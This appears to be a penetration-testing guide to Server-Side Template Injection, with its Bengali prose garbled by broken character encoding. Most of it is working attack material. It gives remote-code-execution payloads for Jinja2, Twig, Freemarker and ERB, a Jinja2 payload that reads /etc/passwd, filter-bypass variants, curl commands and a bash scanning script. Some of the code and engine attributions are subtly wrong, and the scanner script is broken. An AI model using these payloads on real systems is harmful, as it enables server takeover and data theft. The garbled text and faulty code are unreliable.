Server-Side Template Injection (SSTI) à¦–à§à¦à¦œà¦¤à§‡ payload crafting à¦†à¦° error observation à¦à¦° à¦‰à¦ªà¦° à¦«à§‹à¦•à¦¾à¦¸ à¦•à¦°à§‹à¥¤ à¦§à¦¾à¦ªà§‡ à¦§à¦¾à¦ªà§‡ process:

ğŸ¯ à¦•à§‹à¦¥à¦¾à¦¯à¦¼ à¦–à§à¦à¦œà¦¬à§‡ (Prime Locations)

1. User input â†’ HTML output: Profile, comments, search results
2. Dynamic pages: /search?q=, /user/{id}, /post/{slug}
3. API responses with user data
4. Error pages, debug pages
5. Admin panels, CMS inputs

ğŸ” Detection Methodology
Step 1: Basic Payload Testing
# à¦¸à¦¬ template engine à¦ common payloads
{{7*7}}          â†’ 49 (Number template)
{{7}}*'7         â†’ Template detected
${7*7}           â†’ 49 (Expression Language)
<%= 7*7 %>       â†’ 49 (ERB/Rails)
#{7*7}           â†’ 49 (Struts)
<% 7*7 %>        â†’ 49 (JSP)

Step 2: Engine Fingerprinting
# Jinja2/Twig (Python/PHP)
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{7*'7'}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# ERB (Ruby)
<%= system('id') %>

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
ğŸ› ï¸ Step-by-Step Testing Process
Burp Suite Workflow



1. Repeater â†’ User input field à¦ basic payloads à¦ªà¦¾à¦ à¦¾à¦“
2. Response à¦šà§‡à¦• à¦•à¦°à§‹:
   âœ… 49 = Template Injection confirmed
   âœ… Different output = Engine variation
   âŒ Same output = No injection

3. Intruder â†’ Payload positions:
   GET /search?q=Â§Â§Â§
   POST body: {"name": "Â§Â§Â§"}
cURL Testing
bash



# Basic detection
curl -G "https://target.com/search" \
  --data-urlencode "q={{7*7}}"

# Fingerprinting
curl -G "https://target.com/profile" \
  --data-urlencode "name={{config}}"
ğŸ”¥ Engine-Specific Exploitation
1. Jinja2 (Python) - Most Common



Detection: {{7*7}} â†’ 49

RCE Chain:
{{''.__class__.__mro__[1].__subclasses__()}}
â†’ lipsum.__globals__.__builtins__.__import__('os').popen('id').read()
â†’ {{lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

File Read:
{{get_flashed_messages().__globals__.__builtins__.open('/etc/passwd').read()}}
2. Twig (PHP)



Detection: {{7*'7'}} â†’ 7777777

RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.setCache("php")}}{{_self.env.loadTemplate("php")}}
3. Freemarker (Java)



<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
ğŸ“‹ Reproduction Steps (Report Ready)



1. Navigate: https://target.com/search
2. Input: q={{7*7}}
3. Expected: "49" (Proof of injection)
4. RCE Demo: {{''.__class__.__mro__[1].__subclasses__()}}
5. Impact: Full server access demonstrated via `id` command
ğŸ§ª Burp Extension Recommendation



1. SSTImap â†’ Automated SSTI detection
2. Collaborator â†’ External interaction tracking
3. Turbo Intruder â†’ Fast payload testing
ğŸ”„ Bypass Techniques



# URL encoding
{{7*7}} â†’ %7B%7B7*7%7D%7D

# Whitespace bypass
{{ 7 * 7 }}
{{"7"*7}}

# Case bypass (some engines)
{{Config}}
{{cOnFiG}}
ğŸ’¥ Impact Proof (Safe Demo)



âœ… Detection: {{7*7}} â†’ 49
âœ… Fingerprint: {{config.items()}}
âœ… RCE: lipsum.__globals__.__builtins__.__import__('os').popen('id').read()
âœ… File read: /proc/version (no harm)
ğŸš€ Quick Scanner Script
bash



#!/bin/bash
urls=( "/search?q=" "/user?name=" "/profile?display=" )
payloads=( "{{7*7}}" "${7*7}" "<%=7*7%>" )

for url in "${urls[@]}"; do
  for payload in "${payloads[@]}"; do
    response=$(curl -s -G "https://target.com${url}" \
      --data-urlencode "${url##*=}${payload}")
    
    if [[ $response == *"49"* ]]; then
      echo "[+] SSTI FOUND: https://target.com${url}${payload}"
    fi
  done
done
Golden Rule: Response à¦ 49, 7777777, à¦…à¦¥à¦¬à¦¾ unexpected output à¦¦à§‡à¦–à¦²à§‡ immediately fingerprint à¦•à¦°à§‹à¥¤ Jinja2 à¦¸à¦¬à¦šà§‡à¦¯à¦¼à§‡ commonà¥¤
